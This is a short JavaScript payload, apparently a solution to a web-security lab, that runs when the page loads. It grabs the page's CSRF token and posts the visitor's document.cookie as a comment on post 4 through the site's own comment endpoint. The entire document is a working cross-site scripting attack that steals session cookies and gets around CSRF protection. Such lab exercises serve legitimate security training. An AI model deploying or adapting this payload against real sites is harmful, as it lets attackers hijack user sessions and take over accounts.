window.addEventListener('DOMContentLoaded',()=>{


var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf',token);
data.append("postId",4);
data.append("comment",document.cookie);
data.append("name","solved");
data.append("email","abcd@ab.us");
data.append("website","http://doesitmtr");

fetch('/post/comment',{
    method: 'POST',
    mode: 'no-cors',
    body: data,
});
});